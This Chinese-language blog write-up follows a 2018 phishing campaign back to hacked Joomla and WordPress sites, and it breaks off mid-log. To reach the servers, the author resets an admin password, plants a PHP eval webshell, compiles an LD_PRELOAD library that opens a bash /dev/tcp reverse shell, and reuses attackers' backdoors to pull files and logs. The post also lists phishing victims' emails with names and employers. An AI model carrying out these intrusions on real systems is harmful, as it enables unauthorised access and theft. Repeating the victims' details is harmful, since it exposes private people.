访问钓鱼链接，一个克隆OWA修改密码的的虚假页面，我们按照正常流程走一遍，密码随便输入。不出所料页面提示密码错误，这么做可以收集受害者多个密码提高成功率，仔细想想这个功能还是很贴心的：）。\nStep 1\nStep 2\nStep 3\n 抓包如下： 注入、跨站之流都是不存在的。\n访问首页，这是一家俄罗斯的塑料水管厂商，攻击者入侵了这个网站，放置了钓鱼页面，再通过邮件传播。\n端口扫描显示开放了一堆端口，防火墙做了策略限制。\n通过扫描分析，得到沦陷主机信息如下:\n [+] HOST: www.rosturplast.com （137.74.81.5 法国）\n[+] OS: Red Hat 4.8\n[+] Web Server: Apache/2.4.6 OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16\n[+] CMS: Joomla 3.3.3 （Joomla!是一套海外流行的建站系统，基于PHP+MySQL开发）\n 这是一个低版本的Joomla，joomscan扫描显示受害网站有一堆漏洞，看起来弱不禁风，Getshell指日可待。\n扫描发现PHPMailer RCE漏洞，不过需要邮件发送表单功能才能利用，这一堆漏洞里面，看起来唯一有机会的是CVE-2016-9838（Joomla! Core Remote Privilege Escalation Vulnerability），然而经过测试攻击者（丧心病狂）贴心的把用户注册页面删除了！堵住了漏洞，导致无法利用。\n机智的我（此时毫无办法），开始挂字典整合Joomla目录盲扫备份文件，最后发现目标存在PhpMyAdmin后台，和一个报错页面，页面显示了网站绝对路径和疑似以日期格式生成的网站备份的文件名。\n/var/www/rosturpl/data/www/rosturplast.com/rosturplast.com.2015-11-11.zip  3.2 陷入僵局 尝试下载这个文件，http响应404。看了一下同站有多个站点，但旁站渗透是个体力活，国外这种典型的CloudLinux+cPanel的架构不好提权。到这一步陷入了僵局，睡个午觉养养神，下午继续研究。\nwget http://www.rosturplast.com/rosturplast.com.2015-11-11.zip 错误 404：Not Found  3.3 后台提权 不到万不得已，不从旁站和C段入手，稍加思索根据报错页面的备份文件名格式生成日期文件，尝试遍历日期下载，碰碰运气。\n脚本内容：\n#!/bin/bash startdate=`date -d \u0026quot;+0 day $1\u0026quot; +%Y%m%d` enddate=`date -d \u0026quot;+0 day $2\u0026quot; +%Y%m%d` while [[ $startdate -le $enddate ]] do date=$startdate startdateother=`date -d \u0026quot;+0 day $date\u0026quot; +%Y-%m-%d` dateother=$startdateother url=http://www.rosturplast.com/rosturplast.com.$dateother.zip echo \u0026quot;$url\u0026quot; startdate=`date -d \u0026quot;+1 day $date\u0026quot; +%Y-%m-%d` startdateother=`date -d \u0026quot;+1 day $date\u0026quot; +%Y-%m-%d` wget $url done  脚本大概跑了一个下午，当到达2017-08-07的时候，响应200状态码，看到rosturplast.com.2017-08-07.zip的文件大小为177M 感觉成了，解压后果然是整站备份，果然是柳暗花明又一shell。\n查看配置文件configuration.php得到数据库连接信息，登录PhpMyAdmin后台。低权限无法直接写shell，只能修改默认密码登录Joomla!后台。\npublic $dbtype = 'mysqli'; public $host = 'localhost'; public $user = 'user***'; //敏感信息打码 public $password = 'K********6759'; //敏感信息打码 public $db = 'rtp_com3'; public $dbprefix = 'ms8ef_'; public $live_site = ''; public $secret = '5qp******4zU'; //敏感信息打码  备份原始密文以备还原，将后台密码修改为 test123456XYZ\nhttp://www.rosturplast.com/administrator/ admin / test123456XYZ  登录后台，通过模板写入WebShell\n Extensions \u0026mdash;\u0026gt; Template Manager \u0026mdash;\u0026gt; Template \u0026mdash;\u0026gt; New Files \u0026mdash;\u0026gt; PHP WebSehll\n 这里写入了PHP一句话WebShell，通过Cknife（java版中国菜刀）对网站进行控制。\n\u0026lt;?php @eval($_POST['cmd']);?\u0026gt;  查看攻击者的钓鱼文件目录，user.txt 详细记录了上钩的受害者信息。 3.4 日志分析 将网站文件和访问日志下载到本地分析\n[/tmp]$ tar zcvf /var/www/rosturpl/data/www/rosturplast.com/log.tar.gz /var/www/rosturpl/data/access-logs /var/www/rosturpl/data/logs/rosturplast* [/tmp]$ tar zcvf /var/www/rosturpl/data/www/rosturplast.com/www.tar.gz --exclude=/var/www/rosturpl/data/www/rosturplast.com/www.tar.gz /var/www/rosturpl/data/www/rosturplast.com/ wget -c http://www.rosturplast.com/log.tar.gz \u0026amp;\u0026amp; wget -c http://www.rosturplast.com/www.tar.gz ⚡ root@kali  /tmp  gzip -d *.gz ⚡ root@kali  /tmp  ls -lh 总用量 22M -rw-r----- 1 48 6313 392K 11月 30 16:19 rosturplast.com.access.log -rw-r----- 1 48 6313 418K 11月 21 08:08 rosturplast.com.access.log-20181121 -rw-r----- 1 48 6313 315K 11月 22 08:27 rosturplast.com.access.log-20181122 -rw-r----- 1 48 6313 367K 11月 23 08:08 rosturplast.com.access.log-20181123 -rw-r----- 1 48 6313 332K 11月 24 08:20 rosturplast.com.access.log-20181124 -rw-r----- 1 48 6313 394K 11月 25 08:30 rosturplast.com.access.log-20181125 -rw-r----- 1 48 6313 217K 11月 26 08:27 rosturplast.com.access.log-20181126 -rw-r----- 1 48 6313 338K 11月 27 08:07 rosturplast.com.access.log-20181127 -rw-r----- 1 48 6313 1.8M 11月 28 08:35 rosturplast.com.access.log-20181128 -rw-r----- 1 48 6313 2.3M 11月 29 08:38 rosturplast.com.access.log-20181129 -rw-r----- 1 48 6313 6.4M 11月 30 08:38 rosturplast.com.access.log-20181130 -rw-rw---- 1 48 6313 267K 11月 30 16:00 rosturplast.com.error.log -rw-rw---- 1 48 6313 3.8K 11月 21 03:44 rosturplast.com.error.log-20181121 -rw-rw---- 1 48 6313 1.9K 11月 21 14:43 rosturplast.com.error.log-20181122 -rw-rw---- 1 48 6313 1.9K 11月 23 02:30 rosturplast.com.error.log-20181123 -rw-rw---- 1 48 6313 5.0K 11月 24 01:46 rosturplast.com.error.log-20181124 -rw-rw---- 1 48 6313 8.3K 11月 25 02:07 rosturplast.com.error.log-20181125 -rw-rw---- 1 48 6313 2.3K 11月 26 05:05 rosturplast.com.error.log-20181126 -rw-rw---- 1 48 6313 4.1K 11月 27 05:34 rosturplast.com.error.log-20181127 -rw-rw---- 1 48 6313 550K 11月 28 08:35 rosturplast.com.error.log-20181128 -rw-rw---- 1 48 6313 6.5M 11月 29 07:51 rosturplast.com.error.log-20181129 -rw-rw---- 1 48 6313 1.4M 11月 30 08:38 rosturplast.com.error.log-20181130  用D盾扫网站文件，发现这个网站已成跑马场。\n攻击者在shells/目录下放置钓鱼文件和PHP后门。\n查看哪些IP访问了后门并统计次数\n查询攻击者IP地址\n ⚡ root@kali  /tmp/rosturplast.com/log  grep \u0026quot;/shells/\u0026quot; * |grep \u0026quot;php\u0026quot; | awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort -t \u0026quot; \u0026quot; -k 1 -n -r \u0026gt;ip.txt 26 174.85.145.99 20 50.73.252.169 10 213.233.104.120 2 207.228.149.69 2 195.211.23.207 2 129.205.113.8 ⚡ root@kali  /tmp/rosturplast.com/log  for line in $(\u0026lt;ip.txt); do curl https://ip.cn/\\?ip\\=$line ; done IP: 174.85.145.99 来自: 美国 IP: 50.73.252.169 来自: 美国 IP: 213.233.104.120 来自: 罗马尼亚 IP: 207.228.149.69 来自: 百慕大 IP: 195.211.23.207 来自: 俄罗斯 IP: 129.205.113.8 来自: 尼日利亚  根据后门文件名，匹配Apache访问日志得到攻击者的代理IP和User Agent\n ⚡ root@kali  /tmp  grep \u0026quot;/shells\u0026quot; *| grep \u0026quot;php\u0026quot; |grep \u0026quot;POST\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $2 $6}' |sort |uniq 129.205.113.8 - - [30/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36\u0026quot; 174.85.145.99 - - [27/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 207.228.149.69 - - [28/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 213.233.104.120 - - [27/Nov/2018//www.rosturplast.com/shells//bacu.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv 50.73.252.169 - - [29/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot;  通过日志匹配邮箱并去重得到受害者邮箱地址\negrep '[0-Z_]{1,}@[0-Z]{1,}(\\.[0-Z]{1,})+' * | awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |awk -F \u0026quot;HTTP\u0026quot; '{print $1}' |awk -F \u0026quot;ml=\u0026quot; '{print $2}' |sort |uniq ⚡ root@kali  /tmp  egrep '[0-Z_]{1,}@[0-Z]{1,}(\\.[0-Z]{1,})+' * | awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |awk -F \u0026quot;HTTP\u0026quot; '{print $1}' |awk -F \u0026quot;ml=\u0026quot; '{print $2}' |sort |uniq alexsin54@yahoo.com //攻击者邮箱 clavenda.payman@lbdi.net //利比亚发展投行CFO dennis@rayfields.co.za //域名失效 georges.raad@nera.net //新加坡IT基础设施提供商员工 gthakkar@sscinc.com //美国SS\u0026amp;C Technologies, Inc. （印度分公司） jasonchowan223@gmail.com //攻击者邮箱 ******@******.com //同事 jiajie.lim@cimb.com //马来西亚联昌国际银行员工 kohchinbeng@bdo.com.sg //新加坡立信会计师事务所员工 mayfaithlee@hotmail.com //未知 philip@beekoo.hk //深圳市很有蜂格网络科技有限公司CEO Point72.IR@sscinc.com //美国SS\u0026amp;C Technologies, Inc. shunweicapital@sscinc.com //美国SS\u0026amp;C Technologies, Inc.（疑似顺为资本） url@email.com //无效   3.5 受害者身份识别 通过搜索引擎对这15个受害者邮箱进行身份识别。\n3.5.1 alexsin54@yahoo.com / jasonchowan223@gmail.com   alexsin54@yahoo.com：攻击者欺诈账户，曾被举报过，在这里攻击者用来作钓鱼测试。 jasonchowan223@gmail.com：通过钓鱼程序配置文件获得。 ./logon.secureaccess/mail.php:$mail=\u0026quot;jasonchowan223@gmail.com\u0026quot;;\n    来源：http://www.payer.org/test/ 来源：https://avoidaclaim.com/2018/debt-collection-fraud-using-the-name-yeung-alexander-luk/\n  3.5.2 clavenda.payman@lbdi.net   Mrs. Clavenda O. PAYMAN 利比亚发展投行（Liberian Bank forDevelopment and nvestment）首席财务官 来源：https://www.adfi-ci.org/downloads/telecharger.php?Fichier_a_telecharger=files/aadfi_doc_en_20130623170205.pdf\u0026amp;chemin=\u0026amp;id=91\n  3.5.3 georges.raad@nera.net   疑似新加坡 Nera Telecommunications Ltd（IT基础设施提供商）公司员工 来源：http://www.nera.net/about-us.html\n  3.5.4 gthakkar@sscinc.com   美国SS\u0026amp;C Technologies, Inc. \u0026amp; 印度金融服务公司 Globeop Financial Services Technologies (India) Private Limited 来源：https://www.instafinancials.com/company/globeop-financial-services-india-private-limited/U67100MH2003PTC141044\n    来源： [http://www.seepz.gov.in/writereaddatafolder/Regional%20Governing%20Council%20of%20EPCES%20for%202016-18.pdf](http://www.seepz.gov.in/writereaddatafolder/Regional Governing Council of EPCES for 2016-18.pdf)\n  3.5.5 jiajie.lim@cimb.com   马来西亚联昌国际银行员工（CIMB Group） 来源：https://www.cimb.com/en/who-we-are.html\n  3.5.6 kohchinbeng@bdo.com.sg   KOH CHIN BENG 新加坡立信会计师事务所员工\n    来源：https://www.bdo.com.sg/en-gb/our-people/koh-chin-beng\n  3.5.7 philip@beekoo.hk   深圳市很有蜂格网络科技有限公司 CEO 来源：https://m.zhipin.com/job_detail/1407383492.html 来源：https://www.tianyancha.com/company/2349004659\n  四、渗透邮件发送网站  目标：mirohaviar.sk ，这是一个博客网站\n  4.1 漏洞扫描 服务器信息如下:\n [+] HOST: mirohaviar.sk（85.248.229.150 斯洛伐克） [+] OS: Debian 7 [+] Web Server:Apache/2.2.22 PHP/5.2.6-1+lenny16 [+] CMS: Joomla 1.5\n CMS漏洞扫描得到图示的漏洞信息，经过测试全部无法利用，其他端口也没有发现可以利用的的漏洞，看来攻击者也是一个勤奋的同学，入侵成功后做了相应的修复和加固，看起来毫无办法，好像只能旁站或者C段渗透了。\n然而有人的地方就有江湖，有黑客入侵过的网站一定有后门。这类利用通用漏洞批量入侵的黑客团伙，后门文件一般都有特征，我根据前一个网站获得的php后门文件名列表，批量访问当前网站得到了三个相同的后门文件。\n ⚡ root@kali  /tmp/rosturplast.com/webroot/shells  md5sum * 724e7316427151ea1f449f38a28f642c 406.php 3e8a7cf7049e8b9ab8dfca7d3c827c4a aaaa aaf775b99997c166ff45677806d809de an.php e5c06f1f66781ba5c39d909096c4cd47 a.txt f71ad06982064b125d155b6f601198b8 bacu.php f2d7553b97d8e0a0258e48c3ca42a7d2 baer.php c01a0691c484a8d00977a100d8706b50 cfg.php e5c06f1f66781ba5c39d909096c4cd47 config.php md5sum: logon.secureaccess: 是一个目录 983ba05973b84e33e76916ca0dabedec new2bug.txt 1c014f955a67974dc779100c13162f1a priv8.php 2a73dda7ebb3b8d1c0d094b79623e9ff setup.php 80b5dadd0a9856f1e6d950843140d24e switch-security.php 48f50fb676028e0ae82f3f2db4e26247 unzipper.php 51f0bba7ec30b8778dca19ead016a58f webapp365.zip 58d1d66c0be0739319156702522b1b52 wso.php  相同文件名如下：\nhttp://www.mirohaviar.sk/config.php http://www.mirohaviar.sk/an.php http://www.mirohaviar.sk/bacu.php Pro Mailer V2  其中 http://www.mirohaviar.sk/config.php 是攻击者的加密WebShell，理论上只需解密获得密码就能登录这个后门。\n 4.2 解密WebShell 解密过程如下\nawk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php //去除头尾多余字符，得到base64密文。 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' //第一次base64解码，得到16进制密文 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' |xxd -r -p //第二次hex解码，得到base64密文 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' |xxd -r -p |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' //第三次base64解码，得到base64密文 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' |xxd -r -p |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' //第四次base64解码，得到base64密文 awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' config.php| base64 -d -i|awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |sed 's/\\\\x//g' |tr -d '\\\\' |xxd -r -p |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |base64 -d -i |awk -F \u0026quot;\\\u0026quot;\u0026quot; '{print $2}' |base64 -d -i //第五次base64解码，得到明文  得到后门密码hash（MD5），解密后得到明文: root （饶了个大弯原来是个弱口令，下次遇到这类先跑一下密码）\n$auth_pass = \u0026quot;63a9f0ea7bb98050796b649e85481845\u0026quot;;  这个后门有点皮，做了UserAgent判断，我浏览器默认设置的UA是Googlebot，访问显示404，这是反搜索引擎爬虫的惯用手段，所以我换了个正常浏览器的UA访问得到正常页面。\nif(!empty($_SERVER['HTTP_USER_AGENT'])) { $userAgents = array(\u0026quot;Google\u0026quot;, \u0026quot;Slurp\u0026quot;, \u0026quot;MSNBot\u0026quot;, \u0026quot;ia_archiver\u0026quot;, \u0026quot;Yandex\u0026quot;, \u0026quot;Rambler\u0026quot;); if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not Found'); exit; } }   4.3 提权 通过webshell得到了具体系统信息，下一步尝试提权，目的是获得Apache的web访问日志。\n4.3.1 突破disable_functions 测试发现目标限制跨目录（open_basedir），并禁用了命令执行函数，导致WebShell权限下，无法跨目录访问也无法执行命令。\ndisable_functions：\tescapeshellarg,escapeshellcmd,exec,passthru,proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,system,popen,pcntl_exec\topen_basedir：\t/storage/www/mirohaviar.sk/:/storage/www-include/:/usr/share/php5/:/usr/share/file/:/usr/share/pear/:/tmp/   突破的手段很多，这里我利用LD_PRELOAD动态链接来劫持php的mail函数突破disable_functions执行系统命令。\n 查看sendmail函数在执行过程中动态调用哪些标准库函数。\nwww-data@m7web1:/tmp$ readelf -Ws /usr/sbin/sendmail Symbol table '.dynsym' contains 420 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __printf_chk@GLIBC_2.3.4 (2) 2: 0000000000000000 0 FUNC GLOBAL DEFAULT UND getegid@GLIBC_2.2.5 (3) 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND dane_raw_tlsa@DANE_0_0 (4) 4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND gnutls_ocsp_resp_print@GNUTLS_3_4 (5) 5: 0000000000000000 0 FUNC GLOBAL DEFAULT UND gnutls_x509_crt_get_serial@GNUTLS_3_4 (5) 6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __errno_location@GLIBC_2.2.5 (3) 7: 0000000000000000 0 FUNC GLOBAL DEFAULT UND gnutls_db_set_cache_expiration@GNUTLS_3_4 (5) 8: 0000000000000000 0 FUNC GLOBAL DEFAULT UND sendto@GLIBC_2.2.5 (3) ...... 76: 0000000000000000 0 FUNC GLOBAL DEFAULT UND getuid@GLIBC_2.2.5 (3) 77: 0000000000000000 0 FUNC GLOBAL DEFAULT UND send@GLIBC_2.2.5 (3)  从中选取geteuid函数进行测试，编写动态链接程序bypass.c\n#include\u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; void payload() { system(\u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx.xxx.xxx.xxx/999 0\u0026gt;\u0026amp;1\u0026quot;); } int geteuid() { if(getenv(\u0026quot;LD_PRELOAD\u0026quot;) == NULL) { return 0; } unsetenv(\u0026quot;LD_PRELOAD\u0026quot;); payload(); }  当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令调用system执行一个反弹shell的操作（xxx.xxx.xxx.xxx即是我的公网服务器IP）\n编译\ngcc -c -fPIC bypass.c -o bypass gcc -shared bypass.c -o bypass.so  上传\nwww-data@m7web1:/tmp$ cat b64.txt|base64 -d \u0026gt;bypass.so www-data@m7web1:/tmp$ file bypass.so file bypass.so bypass.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)  执行\nbypass.php\n\u0026lt;?php putenv(\u0026quot;LD_PRELOAD=/tmp/bypass.so\u0026quot;); mail(\u0026quot;test@localhost\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;\u0026quot;,\u0026quot;\u0026quot;); ?\u0026gt;  浏览器访问http://www.mirohaviar.sk/bypass.php页面后成功执行命令，得到了一个www-user权限的反弹shell。\n4.3.2 发现行踪 仔细看这是一家斯洛伐克的网络公司，这台服务器上面托管了五百多个网站，当前的权限可以访问这些网站的文件和数据库，令人遗憾的的是apache日志目录/var/log/apache2/无权限访问。\n不过我在/tmp目录下面发现了一个有趣的日志文件。\n[/tmp/]$cat w --2018-11-26 04:49:06-- http://187.85.134.4/cacat/mm.tgz Connecting to 187.85.134.4:80... connected. HTTP request sent, awaiting response... 200 OK Length: 769309 (751K) [application/x-gzip] Saving to: 'mm.tgz' 0K .......... .......... .......... .......... .......... 6% 174K 4s 50K .......... .......... .......... .......... .......... 13% 176K 4s 100K .......... .......... .......... .......... .......... 19% 14.1M 2s 150K .......... .......... .......... .......... .......... 26% 353K 2s 200K .......... .......... .......... .......... .......... 33% 353K 2s 250K .......... .......... .......... .......... .......... 39% 19.8M 1s 300K .......... .......... .......... .......... .......... 46% 355K 1s 350K .......... .......... .......... .......... .......... 53% 28.7M 1s 400K .......... .......... .......... .......... .......... 59% 23.6M 1s 450K .......... .......... .......... .......... .......... 66% 344K 1s 500K .......... .......... .......... .......... .......... 73% 18.0M 0s 550K .......... .......... .......... .......... .......... 79% 360K 0s 600K .......... .......... .......... .......... .......... 86% 20.4M 0s 650K .......... .......... .......... .......... .......... 93% 20.2M 0s 700K .......... .......... .......... .......... .......... 99% 12.7M 0s 750K . 100% 2438G=1.3s 2018-11-26 04:49:10 (577 KB/s) - 'mm.tgz' saved [769309/769309]  4.4 追踪 根据泄露日志，使用谷歌搜索关键字：http://187.85.134.4，发现了一个历史页面。 这是一个已经被删除的后门页面，刚好被谷歌爬虫收录了，进一步搜索一下这个后门参数的关键字： inurl:bc.php?filesrc=，得到了多条后门记录。\n其中多个WebShell缓存页面内容跟上一个被黑网站的临时目录中发现的日志内容吻合，疑似自动化攻击留下的日志，WebShell底部署名：Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber ，表明后门均为这个黑客组织所有。\n进一步搜索这个黑客组织名称，发现大量被黑网站，程序使用Wordpress与Joomla居多。\n 4.5 提取日志 我提取了其中几个被入侵网站的访问日志。\n4.5.1 网站：www.radiolanalhue.cl 打包\ntar zcvf /home/radiolanalhue/public_html/www.radiolanalhue.cl.tar.gz --exclude=/home/radiolanalhue/public_html/www.radiolanalhue.cl.tar.gz /home/radiolanalhue/public_html/ tar zcvf /home/radiolanalhue/public_html/www.radiolanalhue.cl.log.tar.gz /home/radiolanalhue/logs/radiolanalhue.cl-ssl_log-Nov-2018.gz /home/radiolanalhue/access-logs/ /home/radiolanalhue/access-logs/radiolanalhue.cl  下载\nwget -c http://www.radiolanalhue.cl/www.radiolanalhue.cl.tar.gz wget -c http://www.radiolanalhue.cl/www.radiolanalhue.cl.log.tar.gz  分析\n根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。 ✘ ⚡ root@kali  /tmp/radiolanalhue.cl/log/  grep \u0026quot;/beez5/\u0026quot; radiolanalhue.cl-Dec-2018 疑似攻击者代理IP： 212.1.211.3 （美国） - - [30/Nov/2018:13:35:36 -0300] \u0026quot;GET /online/templates/beez5/bc.php HTTP/1.1\u0026quot; 200 16823 \u0026quot;-\u0026quot; \u0026quot;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\u0026quot; 谷歌爬虫： 66.249.66.149 - - [01/Dec/2018:00:53:57 -0300] \u0026quot;GET /online/templates/beez5/bc.php HTTP/1.1\u0026quot; 200 16823 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\u0026quot; 66.249.66.151 - - [01/Dec/2018:06:34:34 -0300] \u0026quot;GET /online/templates/beez5/bc.php?filesrc=/home/radiolanalhue/public_html/online/templates/beez5/favicon.ico\u0026amp;path=/home/radiolanalhue/public_html/online/templates/beez5 HTTP/1.1\u0026quot; 200 2348 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\u0026quot; 66.249.66.153 - - [01/Dec/2018:06:51:46 -0300] \u0026quot;GET /online/templates/beez5/bc.php?filesrc=/home/radiolanalhue/public_html/online/templates/beez5/component.php\u0026amp;path=/home/radiolanalhue/public_html/online/templates/beez5 HTTP/1.1\u0026quot; 200 5456 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\u0026quot;   4.5.2 网站：zebramedia.al 打包\ntar zcvf /home/vayqpdvg/zebramedia.al/zebramedia.al-www.tar.gz --exclude=/home/vayqpdvg/zebramedia.al/zebramedia.al-www.tar.gz /home/vayqpdvg/zebramedia.al/ tar zcvf /home/vayqpdvg/zebramedia.al/zebramedia.al-log.tar.gz /home/vayqpdvg/logs  下载\nwget http://zebramedia.al/zebramedia.al-log.tar.gz wget http://zebramedia.al/zebramedia.al-www.tar.gz -rw-r--r-- 1 1365 1328 478714 11月 30 21:15 evropakrijuese.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 6463 11月 30 21:15 evropakrijuese.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 1855430 6月 30 2018 ftp.publik.live-ftp_log-Jun-2018.gz -rw-r--r-- 1 1365 1328 7899 11月 27 21:12 ftp.publik.live-ftp_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 22883767 11月 30 21:15 ief.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 67526 11月 30 21:15 ief.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 68187 11月 30 21:15 instadyqan.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 34530 11月 30 21:15 instadyqan.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 35748 11月 30 21:15 pigmentnews.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 7709 11月 28 21:15 pigmentnews.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 129055 11月 30 21:15 publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 14487 11月 30 21:15 publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 88292 11月 30 21:15 zebramedia.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 139759 11月 30 21:15 zebramedia.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 6047261 11月 30 21:15 zeri-popullit.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 52004 11月 30 21:15 zeri-popullit.publik.live-ssl_log-Nov-2018.gz  分析\n根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。 ⚡ root@kali  /tmp/zebramedia.al/log/home/vayqpdvg/logs  grep \u0026quot;INSTALL.sql.txt.php\u0026quot; * |grep \u0026quot;php\u0026quot; | awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort |uniq 148 197.211.61.82 (尼日利亚) 8 178.128.221.199 （希腊） ⚡ root@kali  /tmp/zebramedia.al/log/home/vayqpdvg/logs  grep \u0026quot;INSTALL.sql.txt.php\u0026quot; * | grep \u0026quot;php\u0026quot; |grep \u0026quot;POST\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $2 $6}' |sort |uniq 178.128.221.199 - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\u0026quot; 197.211.61.82 - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot;   4.5.2 网站：helioncomposites.com 打包\n日志路径: /home2/helionco/access-logs/helioncomposites.com/ 日志备份: ls /home2/helionco/logs/ ftp.helioncomposites.com-ftp_log-Feb-2018.gz\thelioncomposites.com-Dec-2018.gz\thelioncomposites.com-Nov-2018.gz\thelioncomposites.com-ssl_log-Dec-2018.gz\thelioncomposites.com-ssl_log-Nov-2018.gz\ttar zcvf /home2/helionco/www/helioncomposites.com-www.tar.gz --exclude=/home2/helionco/www/helioncomposites.com-www.tar.gz /home2/helionco/www/ tar zcvf /home2/helionco/www/helioncomposites.com-log.tar.gz /home2/helionco/logs/ /home2/helionco/access-logs/helioncomposites.com/  下载\nwget http://helioncomposites.com/helioncomposites.com-log.tar.gz wget http://helioncomposites.com/helioncomposites.com-www.tar.gz  分析\n根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。 ⚡ root@kali  /tmp  grep \u0026quot;.php\u0026quot; * |grep \u0026quot;/home2/helionco/public_html/\u0026quot; |grep \u0026quot;HTTP\\/1.1\\\u0026quot; 200\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort -t \u0026quot; \u0026quot; -k 1 -n -r \u0026gt;ip.txt 1137 198.143.51.17 588 198.143.38.3 478 198.143.41.14 246 